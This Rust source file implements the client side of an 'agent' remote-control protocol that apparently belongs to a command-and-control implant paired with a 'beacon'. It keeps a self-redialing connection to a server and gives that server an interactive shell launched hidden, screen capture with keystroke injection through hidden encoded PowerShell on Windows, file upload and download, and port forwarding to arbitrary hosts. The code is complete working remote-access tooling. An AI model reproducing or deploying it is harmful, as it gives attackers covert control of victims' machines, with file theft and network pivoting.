// Type2 RCP client (shared/protocol/rcp.go): one long-lived multiplexed TCP
// connection, independent of the Type1 beacon. Channels: interactive shell,
// screen view, file transfer (up/down with resume) and port forwarding.
use hmac::{Hmac, Mac};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{Shutdown, TcpStream, ToSocketAddrs};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering};
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use crate::commands::hidden;

const RCP_MAGIC: [u8; 4] = *b"WRCP";
const RCP_VERSION: u8 = 2;
const RCP_HEADER: usize = 19;
const RCP_MAX_FRAME: usize = 16 << 20;

const KIND_HELLO: u8 = 0x01;
const KIND_ACK: u8 = 0x02;
const KIND_CHALLENGE: u8 = 0x08;
const KIND_OPEN: u8 = 0x03;
const KIND_FRAME: u8 = 0x04;
const KIND_CLOSE: u8 = 0x05;
const KIND_PING: u8 = 0x06;
const KIND_PONG: u8 = 0x07;

const FLAG_JSON: u8 = 1;

#[derive(Debug, Clone)]
pub(crate) struct Frame {
    chan: u32,
    kind: u8,
    flags: u8,
    seq: u32,
    payload: Vec<u8>,
}

#[derive(Deserialize)]
struct RcpOpen {
    chan: u32,
    kind: String,
    #[serde(default)]
    args: Value,
}

#[derive(Serialize, Deserialize)]
struct RcpClose {
    chan: u32,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    reason: String,
}

#[derive(Serialize, Deserialize, Default, Clone, Debug)]
pub struct FileCtrl {
    #[serde(default)]
    pub op: String,
    #[serde(default)]
    pub mode: String,
    #[serde(default)]
    pub job: String,
    #[serde(default)]
    pub path: String,
    #[serde(default)]
    pub size: i64,
    #[serde(default)]
    pub chunk: usize,
    #[serde(default)]
    pub resume: usize,
    #[serde(default)]
    pub sha256: String,
    #[serde(default)]
    pub ok: bool,
    #[serde(default)]
    pub reason: String,
}

#[derive(Debug)]
pub(crate) struct Delivery {
    pub(crate) ctrl: bool,
    pub(crate) data: Vec<u8>,
}

pub(crate) struct Chan {
    tx: Sender<Delivery>,
    stop: Arc<AtomicBool>,
}

pub(crate) type Chans = Arc<Mutex<HashMap<u32, Chan>>>;

pub struct RcpCtl {
    agent: String,
    wanted: AtomicBool,
    running: AtomicBool,
    gen: AtomicU64,
    conn: Mutex<Option<TcpStream>>,
    creds: Mutex<(String, String)>,
}

impl RcpCtl {
    pub fn new(agent: &str) -> Arc<Self> {
        Arc::new(Self {
            agent: agent.to_string(),
            wanted: AtomicBool::new(false),
            running: AtomicBool::new(false),
            gen: AtomicU64::new(0),
            conn: Mutex::new(None),
            creds: Mutex::new((String::new(), String::new())),
        })
    }

    pub fn set_credentials(&self, addr: &str, token: &str) {
        *self.creds.lock().unwrap() = (addr.to_string(), token.to_string());
    }

    pub fn start(self: &Arc<Self>, addr: &str, token: &str) {
        self.set_credentials(addr, token);
        self.wanted.store(true, Ordering::SeqCst);
        if let Some(c) = self.conn.lock().unwrap().take() {
            let _ = c.shutdown(Shutdown::Both); // redial with the new endpoint
        }
        if !self.running.swap(true, Ordering::SeqCst) {
            let me = Arc::clone(self);
            std::thread::spawn(move || me.run());
        }
    }

    pub fn reconnect(self: &Arc<Self>) {
        self.wanted.store(true, Ordering::SeqCst);
        if let Some(c) = self.conn.lock().unwrap().take() {
            let _ = c.shutdown(Shutdown::Both);
        }
        if !self.running.swap(true, Ordering::SeqCst) {
            let me = Arc::clone(self);
            std::thread::spawn(move || me.run());
        }
    }

    pub fn stop(&self) {
        self.wanted.store(false, Ordering::SeqCst);
        self.gen.fetch_add(1, Ordering::SeqCst);
        if let Some(c) = self.conn.lock().unwrap().take() {
            let _ = c.shutdown(Shutdown::Both);
        }
    }

    pub fn wanted(&self) -> bool {
        self.wanted.load(Ordering::SeqCst)
    }

    fn run(self: Arc<Self>) {
        while self.wanted.load(Ordering::SeqCst) {
            let (addr, token) = self.creds.lock().unwrap().clone();
            if !addr.is_empty() {
                if let Err(e) = session(&self, &addr, &token) {
                    eprintln!("rcp: session ended: {e} (redial in 5s)");
                }
            }
            if !self.wanted.load(Ordering::SeqCst) {
                break;
            }
            std::thread::sleep(Duration::from_secs(5));
        }
        self.running.store(false, Ordering::SeqCst);
        // A start()/reconnect() may have arrived while this loop was winding
        // down; honor it instead of leaving the channel down.
        if self.wanted.load(Ordering::SeqCst) && !self.running.swap(true, Ordering::SeqCst) {
            let me = Arc::clone(&self);
            std::thread::spawn(move || me.run());
        }
    }
}

fn rcp_proof(key: &[u8], label: &str, agent: &str, server_nonce: &str, agent_nonce: &str) -> String {
    let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("hmac accepts any key");
    mac.update(format!("{label}|{agent}|{server_nonce}|{agent_nonce}").as_bytes());
    hex::encode(&mac.finalize().into_bytes()[..16])
}

fn rand_nonce() -> Result<String, String> {
    let mut b = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut b);
    Ok(hex::encode(b))
}

fn ct_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut d = 0u8;
    for (x, y) in a.iter().zip(b) {
        d |= x ^ y;
    }
    d == 0
}

fn dial(addr: &str) -> Result<TcpStream, String> {
    let addr = addr.strip_prefix("tcp://").unwrap_or(addr);
    let socks = addr.to_socket_addrs().map_err(|e| format!("resolve {addr}: {e}"))?;
    let mut last = String::new();
    for sa in socks {
        match TcpStream::connect_timeout(&sa, Duration::from_secs(10)) {
            Ok(c) => {
                let _ = c.set_nodelay(true);
                let _ = c.set_read_timeout(Some(Duration::from_secs(90)));
                let _ = c.set_write_timeout(Some(Duration::from_secs(30)));
                return Ok(c);
            }
            Err(e) => last = format!("connect {addr}: {e}"),
        }
    }
    Err(last)
}

fn session(ctl: &Arc<RcpCtl>, addr: &str, token: &str) -> Result<(), String> {
    if addr.starts_with("kcp://") {
        return Err("kcp:// RCP transport is not implemented in the Rust agent".into());
    }
    let mut conn = dial(addr)?;
    let key_vec = hex::decode(token).map_err(|_| "rcp: bad token".to_string())?;
    if key_vec.len() != 16 {
        return Err("rcp: bad token length".into());
    }
    let mut key = [0u8; 16];
    key.copy_from_slice(&key_vec);

    // v2: the server speaks first with a nonce; the token never crosses the
    // wire. The ack carries a server proof so a fake listener cannot drive us.
    let ch = read_frame(&mut conn)?;
    if ch.kind != KIND_CHALLENGE {
        return Err(format!("unexpected handshake frame {:#x}", ch.kind));
    }
    #[derive(Deserialize, Default)]
    struct Challenge {
        #[serde(default)]
        nonce: String,
    }
    let ch: Challenge = serde_json::from_slice(&ch.payload).unwrap_or_default();
    if ch.nonce.len() != 32 {
        return Err("rcp: bad challenge".into());
    }
    let an = rand_nonce()?;
    let proof = rcp_proof(&key, "agent", &ctl.agent, &ch.nonce, &an);
    let hello = json!({ "agent": ctl.agent, "nonce": an, "proof": proof });
    write_frame(&mut conn, &Frame {
        chan: 0,
        kind: KIND_HELLO,
        flags: 0,
        seq: 0,
        payload: serde_json::to_vec(&hello).unwrap(),
    })?;
    let ack = read_frame(&mut conn)?;
    if ack.kind != KIND_ACK {
        return Err(format!("unexpected handshake frame {:#x}", ack.kind));
    }
    #[derive(Deserialize, Default)]
    struct Ack {
        #[serde(default)]
        ok: bool,
        #[serde(default)]
        reason: String,
        #[serde(default)]
        proof: String,
    }
    let ack: Ack = serde_json::from_slice(&ack.payload).unwrap_or_default();
    if !ack.ok {
        return Err(format!("rcp rejected: {}", ack.reason));
    }
    let want = rcp_proof(&key, "server", &ctl.agent, &ch.nonce, &an);
    if !ct_eq(ack.proof.as_bytes(), want.as_bytes()) {
        return Err("rcp: server proof mismatch".into());
    }
    eprintln!("rcp: connected {addr}");

    *ctl.conn.lock().unwrap() = Some(conn.try_clone().map_err(|e| e.to_string())?);
    let writer_stream = conn.try_clone().map_err(|e| e.to_string())?;
    let (tx, rx) = mpsc::channel::<Frame>();
    let seq = Arc::new(AtomicU32::new(0));
    let writer = std::thread::spawn(move || write_loop(writer_stream, rx));
    let chans: Chans = Arc::new(Mutex::new(HashMap::new()));

    let mut result = Ok(());
    loop {
        let f = match read_frame(&mut conn) {
            Ok(f) => f,
            Err(e) => {
                result = Err(e);
                break;
            }
        };
        match f.kind {
            KIND_OPEN => {
                let Ok(op) = serde_json::from_slice::<RcpOpen>(&f.payload) else {
                    continue;
                };
                let (dtx, drx) = mpsc::channel::<Delivery>();
                let stop = Arc::new(AtomicBool::new(false));
                chans
                    .lock()
                    .unwrap()
                    .insert(op.chan, Chan { tx: dtx, stop: Arc::clone(&stop) });
                dispatch_channel(op, tx.clone(), Arc::clone(&seq), drx, stop, Arc::clone(&chans));
            }
            KIND_FRAME => {
                let tx = chans.lock().unwrap().get(&f.chan).map(|c| c.tx.clone());
                if let Some(tx) = tx {
                    let _ = tx.send(Delivery { ctrl: f.flags & FLAG_JSON != 0, data: f.payload });
                }
            }
            KIND_CLOSE => {
                let close: RcpClose = serde_json::from_slice(&f.payload).unwrap_or(RcpClose {
                    chan: f.chan,
                    reason: String::new(),
                });
                drop_channel(&chans, close.chan);
            }
            KIND_PING => {
                let _ = tx.send(Frame {
                    chan: f.chan,
                    kind: KIND_PONG,
                    flags: 0,
                    seq: next_seq(&seq),
                    payload: Vec::new(),
                });
            }
            KIND_PONG => {}
            _ => break,
        }
    }

    // Tear down every channel; dropping senders wakes the handler threads.
    let ids: Vec<u32> = chans.lock().unwrap().keys().copied().collect();
    for id in ids {
        drop_channel(&chans, id);
    }
    drop(tx);
    let _ = conn.shutdown(Shutdown::Both);
    let _ = writer.join();
    *ctl.conn.lock().unwrap() = None;
    result
}

fn dispatch_channel(
    op: RcpOpen,
    tx: Sender<Frame>,
    seq: Arc<AtomicU32>,
    rx: Receiver<Delivery>,
    stop: Arc<AtomicBool>,
    chans: Chans,
) {
    let id = op.chan;
    match op.kind.as_str() {
        "shell" => {
            std::thread::spawn(move || {
                run_shell(id, tx, seq, rx, chans);
            });
        }
        "view" => {
            std::thread::spawn(move || {
                // Windows agents prefer the native rdp plugin (plan P5: the
                // capture/input logic lives in plugins/rdp-windows); the
                // built-in loop stays as the cross-platform fallback.
                #[cfg(windows)]
                if crate::native_plugin::has_view() {
                    crate::native_plugin::try_run_view(id, tx, seq, rx, stop, chans);
                    return;
                }
                run_view(id, tx, seq, rx, stop, chans);
            });
        }
        "file" => {
            let begin: FileCtrl = serde_json::from_value(op.args).unwrap_or_default();
            std::thread::spawn(move || {
                run_file(id, begin, tx, seq, rx, stop, chans);
            });
        }
        "fwd" => {
            let target = op
                .args
                .get("target")
                .and_then(Value::as_str)
                .unwrap_or("")
                .to_string();
            std::thread::spawn(move || {
                run_fwd(id, &target, tx, seq, rx, stop, chans);
            });
        }
        _ => {
            send_close(&tx, &seq, id, "unsupported kind");
            drop_channel(&chans, id);
        }
    }
}

fn drop_channel(chans: &Chans, id: u32) {
    if let Some(c) = chans.lock().unwrap().remove(&id) {
        c.stop.store(true, Ordering::SeqCst);
    }
}

fn next_seq(seq: &AtomicU32) -> u32 {
    seq.fetch_add(1, Ordering::SeqCst) + 1
}

fn send_raw(tx: &Sender<Frame>, seq: &AtomicU32, chan: u32, data: Vec<u8>) -> bool {
    tx.send(Frame { chan, kind: KIND_FRAME, flags: 0, seq: next_seq(seq), payload: data }).is_ok()
}

// crate-internal surface used by the native plugin host (plan P5): plugins
// push view frames and retire their channel without touching rcp internals.
// Windows-only: the native plugin host is the sole caller.
#[cfg(windows)]
pub(crate) fn send_frame(tx: &Sender<Frame>, seq: &AtomicU32, chan: u32, data: Vec<u8>) -> bool {
    send_raw(tx, seq, chan, data)
}

#[cfg(windows)]
pub(crate) fn drop_chan(chans: &Chans, id: u32) {
    drop_channel(chans, id);
}

fn send_ctrl<T: Serialize>(tx: &Sender<Frame>, seq: &AtomicU32, chan: u32, ctrl: &T) -> bool {
    let payload = serde_json::to_vec(ctrl).unwrap_or_default();
    tx.send(Frame { chan, kind: KIND_FRAME, flags: FLAG_JSON, seq: next_seq(seq), payload }).is_ok()
}

fn send_close(tx: &Sender<Frame>, seq: &AtomicU32, chan: u32, reason: &str) {
    let payload = serde_json::to_vec(&RcpClose { chan, reason: reason.into() }).unwrap_or_default();
    let _ = tx.send(Frame { chan, kind: KIND_CLOSE, flags: 0, seq: next_seq(seq), payload });
}

fn write_frame(w: &mut impl Write, f: &Frame) -> Result<(), String> {
    if f.payload.len() > RCP_MAX_FRAME {
        return Err("rcp: frame exceeds cap".into());
    }
    let mut h = vec![0u8; RCP_HEADER + f.payload.len()];
    h[0..4].copy_from_slice(&RCP_MAGIC);
    h[4] = RCP_VERSION;
    h[5..9].copy_from_slice(&f.chan.to_be_bytes());
    h[9] = f.kind;
    h[10] = f.flags;
    h[11..15].copy_from_slice(&f.seq.to_be_bytes());
    h[15..19].copy_from_slice(&(f.payload.len() as u32).to_be_bytes());
    h[RCP_HEADER..].copy_from_slice(&f.payload);
    w.write_all(&h).map_err(|e| format!("rcp write: {e}"))?;
    w.flush().map_err(|e| format!("rcp flush: {e}"))
}

fn read_frame(r: &mut impl Read) -> Result<Frame, String> {
    let mut h = [0u8; RCP_HEADER];
    r.read_exact(&mut h).map_err(|e| format!("rcp read: {e}"))?;
    if h[0..4] != RCP_MAGIC {
        return Err("rcp: bad magic".into());
    }
    if h[4] != RCP_VERSION {
        return Err(format!("rcp: unsupported version {}", h[4]));
    }
    let size = u32::from_be_bytes([h[15], h[16], h[17], h[18]]) as usize;
    if size > RCP_MAX_FRAME {
        return Err(format!("rcp: frame too large: {size}"));
    }
    let mut payload = vec![0u8; size];
    if size > 0 {
        r.read_exact(&mut payload).map_err(|e| format!("rcp read: {e}"))?;
    }
    Ok(Frame {
        chan: u32::from_be_bytes([h[5], h[6], h[7], h[8]]),
        kind: h[9],
        flags: h[10],
        seq: u32::from_be_bytes([h[11], h[12], h[13], h[14]]),
        payload,
    })
}

fn write_loop(mut w: TcpStream, rx: Receiver<Frame>) {
    for f in rx {
        if write_frame(&mut w, &f).is_err() {
            break;
        }
    }
    let _ = w.shutdown(Shutdown::Both);
}

// ---- shell ---------------------------------------------------------------

fn run_shell(
    chan: u32,
    tx: Sender<Frame>,
    seq: Arc<AtomicU32>,
    rx: Receiver<Delivery>,
    chans: Chans,
) {
    // A real terminal is the difference between a usable console (echo, line
    // editing, job control, resize, Ctrl+C) and a dumb byte pipe. Fall back to
    // pipes only when the platform refuses a pty; the console then switches to
    // its local line-edit mode (hello.tty=false).
    match crate::pty::Pty::spawn(120, 30) {
        Ok((pty, shell)) => {
            send_ctrl(
                &tx,
                &seq,
                chan,
                &json!({
                    "op": "hello", "tty": true, "shell": shell,
                    "os": std::env::consts::OS, "encoding": "utf-8",
                }),
            );
            run_pty_shell(chan, pty, tx, seq, rx, chans);
        }
        Err(_) => run_pipe_shell(chan, tx, seq, rx, chans),
    }
}

fn run_pty_shell(
    chan: u32,
    pty: crate::pty::Pty,
    tx: Sender<Frame>,
    seq: Arc<AtomicU32>,
    rx: Receiver<Delivery>,
    chans: Chans,
) {
    let pty = Arc::new(pty);
    let out = Arc::clone(&pty);
    let otx = tx.clone();
    let oseq = Arc::clone(&seq);
    let ochans = Arc::clone(&chans);
    std::thread::spawn(move || {
        let mut buf = [0u8; 8192];
        loop {
            match out.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    if !send_raw(&otx, &oseq, chan, buf[..n].to_vec()) {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
        send_close(&otx, &oseq, chan, "shell ended");
        drop_channel(&ochans, chan);
    });

    std::thread::spawn(move || {
        while let Ok(d) = rx.recv() {
            if d.ctrl {
                if let Ok(v) = serde_json::from_slice::<Value>(&d.data) {
                    if v.get("op").and_then(Value::as_str) == Some("resize") {
                        let cols = v.get("cols").and_then(Value::as_u64).unwrap_or(0) as u16;
                        let rows = v.get("rows").and_then(Value::as_u64).unwrap_or(0) as u16;
                        if cols > 0 && rows > 0 {
                            pty.resize(cols, rows);
                        }
                    }
                }
                continue;
            }
            if pty.write_all(&d.data).is_err() {
                break;
            }
        }
        pty.kill();
    });
}

fn run_pipe_shell(
    chan: u32,
    tx: Sender<Frame>,
    seq: Arc<AtomicU32>,
    rx: Receiver<Delivery>,
    chans: Chans,
) {
    let mut cmd;
    let label;
    if cfg!(windows) {
        cmd = Command::new("cmd");
        cmd.args(["/Q", "/K", "chcp 65001>nul"]);
        label = "cmd";
    } else {
        let bash = std::path::Path::new("/bin/bash").exists();
        cmd = Command::new(if bash { "/bin/bash" } else { "/bin/sh" });
        cmd.arg("-i");
        let utf8 = std::env::var("LC_ALL")
            .or_else(|_| std::env::var("LANG"))
            .ok()
            .filter(|v| {
                let l = v.to_ascii_lowercase();
                l.contains("utf-8") || l.contains("utf8")
            })
            .unwrap_or_else(|| "C.UTF-8".to_string());
        cmd.env("LANG", &utf8).env("LC_ALL", &utf8);
        label = if bash { "bash" } else { "sh" };
    }
    let child = hidden(&mut cmd)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn();
    let mut child: Child = match child {
        Ok(c) => c,
        Err(e) => {
            send_close(&tx, &seq, chan, &format!("shell start: {e}"));
            drop_channel(&chans, chan);
            return;
        }
    };
    send_ctrl(
        &tx,
        &seq,
        chan,
        &json!({
            "op": "hello", "tty": false, "shell": label,
            "os": std::env::consts::OS, "encoding": "utf-8",
        }),
    );
    let stdin = child.stdin.take();
    let stdout = child.stdout.take();
    let stderr = child.stderr.take();
    let child = Arc::new(Mutex::new(Some(child)));

    let mut readers = Vec::new();
    if let Some(mut out) = stdout {
        let tx = tx.clone();
        let seq = Arc::clone(&seq);
        readers.push(std::thread::spawn(move || pump_output(&mut out, chan, &tx, &seq)));
    }
    if let Some(mut err) = stderr {
        let tx = tx.clone();
        let seq = Arc::clone(&seq);
        readers.push(std::thread::spawn(move || pump_output(&mut err, chan, &tx, &seq)));
    }
    // Drain the child when it exits, then tell the console.
    let waiter = Arc::clone(&child);
    let close_tx = tx.clone();
    let close_seq = Arc::clone(&seq);
    let close_chans = Arc::clone(&chans);
    std::thread::spawn(move || {
        for t in readers {
            let _ = t.join();
        }
        send_close(&close_tx, &close_seq, chan, "shell ended");
        drop_channel(&close_chans, chan);
        if let Some(mut c) = waiter.lock().unwrap().take() {
            let _ = c.wait();
        }
    });

    let killer = Arc::clone(&child);
    std::thread::spawn(move || {
        let mut stdin: Option<ChildStdin> = stdin;
        while let Ok(d) = rx.recv() {
            if d.ctrl {
                continue;
            }
            let Some(w) = stdin.as_mut() else { break };
            if w.write_all(&d.data).is_err() {
                break;
            }
            let _ = w.flush();
        }
        drop(stdin);
        if let Some(mut c) = killer.lock().unwrap().take() {
            let _ = c.kill();
            let _ = c.wait();
        }
    });
}

fn pump_output(r: &mut impl Read, chan: u32, tx: &Sender<Frame>, seq: &AtomicU32) {
    let mut buf = [0u8; 4096];
    loop {
        match r.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                if !send_raw(tx, seq, chan, buf[..n].to_vec()) {
                    break;
                }
            }
            Err(_) => break,
        }
    }
}

// ---- screen view ---------------------------------------------------------

#[derive(Deserialize)]
struct InputEvent {
    #[serde(default)]
    t: String,
    #[serde(default)]
    s: String,
    #[serde(default)]
    k: String,
}

fn run_view(
    chan: u32,
    tx: Sender<Frame>,
    seq: Arc<AtomicU32>,
    rx: Receiver<Delivery>,
    stop: Arc<AtomicBool>,
    chans: Chans,
) {
    let mut fails = 0;
    loop {
        if stop.load(Ordering::SeqCst) {
            break;
        }
        match crate::commands::capture_screen() {
            Ok(data) if !data.is_empty() => {
                fails = 0;
                if !send_raw(&tx, &seq, chan, data) {
                    break;
                }
            }
            _ => {
                fails += 1;
                if fails >= 3 {
                    send_close(&tx, &seq, chan, "capture failed (screen recording permission?)");
                    break;
                }
            }
        }
        match rx.recv_timeout(Duration::from_secs(1)) {
            Ok(d) => {
                if !d.ctrl {
                    if let Ok(ev) = serde_json::from_slice::<InputEvent>(&d.data) {
                        std::thread::spawn(move || inject_input(ev));
                    }
                }
            }
            Err(mpsc::RecvTimeoutError::Timeout) => {}
            Err(mpsc::RecvTimeoutError::Disconnected) => break,
        }
    }
    drop_channel(&chans, chan);
}

fn inject_input(ev: InputEvent) {
    if ev.t == "cmd" {
        let text = match ev.k.as_str() {
            "enter" => "{ENTER}",
            "tab" => "{TAB}",
            "esc" => "{ESC}",
            "backspace" => "{BACKSPACE}",
            "space" => " ",
            _ => return,
        };
        send_keys(text);
    } else if ev.t == "key" && !ev.s.is_empty() && ev.s.len() <= 64 {
        send_keys(&ev.s);
    }
}

#[cfg(windows)]
fn send_keys(text: &str) {
    use base64::Engine;
    let escaped = text.replace('\'', "''");
    let script = format!(
        "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{escaped}')"
    );
    let units: Vec<u16> = script.encode_utf16().collect();
    let mut bytes = Vec::with_capacity(units.len() * 2);
    for u in units {
        bytes.extend_from_slice(&u.to_le_bytes());
    }
    let enc = crate::envelope::b64().encode(bytes);
    let mut cmd = Command::new("powershell");
    cmd.args(["-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", &enc]);
    let _ = hidden(&mut cmd).stdin(Stdio::null()).output();
}

#[cfg(target_os = "macos")]
fn send_keys(text: &str) {
    let _ = Command::new("osascript")
        .args(["-e", &format!("tell application \"System Events\" to keystroke {:?}", text)])
        .status();
}

#[cfg(all(unix, not(target_os = "macos")))]
fn send_keys(text: &str) {
    let _ = Command::new("xdotool").args(["type", "--", text]).status();
}

// ---- file transfer -------------------------------------------------------

fn run_file(
    chan: u32,
    begin: FileCtrl,
    tx: Sender<Frame>,
    seq: Arc<AtomicU32>,
    rx: Receiver<Delivery>,
    stop: Arc<AtomicBool>,
    chans: Chans,
) {
    match begin.mode.as_str() {
        "up" => file_up(chan, &begin, &tx, &seq, &rx, &stop),
        "down" => file_down(chan, &begin, &tx, &seq, &rx, &stop),
        _ => {
            send_ctrl(
                &tx,
                &seq,
                chan,
                &FileCtrl { op: "error".into(), job: begin.job.clone(), reason: "bad mode".into(), ..Default::default() },
            );
        }
    }
    drop_channel(&chans, chan);
}

fn file_up(
    chan: u32,
    begin: &FileCtrl,
    tx: &Sender<Frame>,
    seq: &AtomicU32,
    rx: &Receiver<Delivery>,
    stop: &AtomicBool,
) {
    let chunk = begin.chunk.max(1);
    let mut f = match std::fs::File::open(&begin.path) {
        Ok(f) => f,
        Err(e) => {
            send_ctrl(tx, seq, chan, &FileCtrl {
                op: "error".into(),
                job: begin.job.clone(),
                reason: e.to_string(),
                ..Default::default()
            });
            return;
        }
    };
    if !send_ctrl(tx, seq, chan, &FileCtrl {
        op: "ready".into(),
        mode: "up".into(),
        job: begin.job.clone(),
        ..Default::default()
    }) {
        return;
    }
    let resume = loop {
        match rx.recv() {
            Ok(d) if d.ctrl => {
                if let Ok(c) = serde_json::from_slice::<FileCtrl>(&d.data) {
                    break c.resume;
                }
            }
            Ok(_) => {}
            Err(_) => return,
        }
    };
    use std::io::Seek;
    if resume > 0 && f.seek(std::io::SeekFrom::Start((resume * chunk) as u64)).is_err() {
        return;
    }
    let mut buf = vec![0u8; chunk];
    loop {
        if stop.load(Ordering::SeqCst) {
            return;
        }
        match f.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                if !send_raw(tx, seq, chan, buf[..n].to_vec()) {
                    return;
                }
            }
            Err(e) => {
                send_ctrl(tx, seq, chan, &FileCtrl {
                    op: "error".into(),
                    job: begin.job.clone(),
                    reason: e.to_string(),
                    ..Default::default()
                });
                return;
            }
        }
    }
    let mut h = Sha256::new();
    if let Ok(mut whole) = std::fs::File::open(&begin.path) {
        let mut b = [0u8; 64 * 1024];
        while let Ok(n) = whole.read(&mut b) {
            if n == 0 {
                break;
            }
            h.update(&b[..n]);
        }
    }
    send_ctrl(tx, seq, chan, &FileCtrl {
        op: "end".into(),
        job: begin.job.clone(),
        sha256: hex::encode(h.finalize()),
        ..Default::default()
    });
}

fn file_down(
    chan: u32,
    begin: &FileCtrl,
    tx: &Sender<Frame>,
    seq: &AtomicU32,
    rx: &Receiver<Delivery>,
    stop: &AtomicBool,
) {
    let chunk = begin.chunk.max(1);
    let part = format!("{}.part", begin.path);
    if let Some(parent) = std::path::Path::new(&begin.path).parent() {
        if !parent.as_os_str().is_empty() {
            let _ = std::fs::create_dir_all(parent);
        }
    }
    let have = std::fs::metadata(&part).map(|m| m.len()).unwrap_or(0);
    let resume = (have / chunk as u64) as usize;
    let mut f = match std::fs::OpenOptions::new().create(true).write(true).open(&part) {
        Ok(f) => f,
        Err(e) => {
            // The server's waitReadyDown only understands ready|error; a
            // "done" here would leave the job pending forever.
            send_ctrl(tx, seq, chan, &FileCtrl {
                op: "error".into(),
                job: begin.job.clone(),
                reason: e.to_string(),
                ..Default::default()
            });
            return;
        }
    };
    use std::io::Seek;
    if f.seek(std::io::SeekFrom::Start((resume * chunk) as u64)).is_err() {
        return;
    }
    if !send_ctrl(tx, seq, chan, &FileCtrl {
        op: "ready".into(),
        mode: "down".into(),
        job: begin.job.clone(),
        resume,
        ..Default::default()
    }) {
        return;
    }
    let done = |ok: bool, reason: &str, sha: String| {
        send_ctrl(tx, seq, chan, &FileCtrl {
            op: "done".into(),
            job: begin.job.clone(),
            ok,
            reason: reason.into(),
            sha256: sha,
            ..Default::default()
        });
    };
    loop {
        if stop.load(Ordering::SeqCst) {
            return;
        }
        let d = match rx.recv() {
            Ok(d) => d,
            Err(_) => return,
        };
        if !d.ctrl {
            if let Err(e) = f.write_all(&d.data) {
                done(false, &e.to_string(), String::new());
                return;
            }
            continue;
        }
        let Ok(c) = serde_json::from_slice::<FileCtrl>(&d.data) else {
            continue;
        };
        match c.op.as_str() {
            "end" => {
                if let Err(e) = f.sync_all() {
                    done(false, &e.to_string(), String::new());
                    return;
                }
                drop(f);
                let raw = match std::fs::read(&part) {
                    Ok(d) => d,
                    Err(e) => {
                        done(false, &e.to_string(), String::new());
                        return;
                    }
                };
                let got = hex::encode(Sha256::digest(&raw));
                if !c.sha256.is_empty() && got != c.sha256 {
                    done(false, "sha256 mismatch", got);
                    return;
                }
                if std::path::Path::new(&begin.path).exists() {
                    let _ = std::fs::remove_file(&begin.path);
                }
                if let Err(e) = std::fs::rename(&part, &begin.path) {
                    done(false, &e.to_string(), got);
                    return;
                }
                done(true, "", got);
                return;
            }
            "error" => {
                done(false, &c.reason, String::new());
                return;
            }
            _ => {}
        }
    }
}

// ---- port forwarding -----------------------------------------------------

fn run_fwd(
    chan: u32,
    target: &str,
    tx: Sender<Frame>,
    seq: Arc<AtomicU32>,
    rx: Receiver<Delivery>,
    stop: Arc<AtomicBool>,
    chans: Chans,
) {
    let mut conn = match TcpStream::connect(target) {
        Ok(c) => c,
        Err(e) => {
            send_close(&tx, &seq, chan, &format!("dial {target}: {e}"));
            drop_channel(&chans, chan);
            return;
        }
    };
    let _ = conn.set_nodelay(true);
    let mut reader = match conn.try_clone() {
        Ok(r) => r,
        Err(e) => {
            send_close(&tx, &seq, chan, &e.to_string());
            drop_channel(&chans, chan);
            return;
        }
    };
    let read_tx = tx.clone();
    let read_seq = Arc::clone(&seq);
    let read_stop = Arc::clone(&stop);
    let reader_thread = std::thread::spawn(move || {
        let mut buf = [0u8; 32 * 1024];
        loop {
            if read_stop.load(Ordering::SeqCst) {
                break;
            }
            match reader.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    if !send_raw(&read_tx, &read_seq, chan, buf[..n].to_vec()) {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
        send_close(&read_tx, &read_seq, chan, "target eof");
    });
    while let Ok(d) = rx.recv() {
        if d.ctrl {
            continue;
        }
        if conn.write_all(&d.data).is_err() {
            break;
        }
    }
    stop.store(true, Ordering::SeqCst);
    let _ = conn.shutdown(Shutdown::Both);
    let _ = reader_thread.join();
    drop_channel(&chans, chan);
}

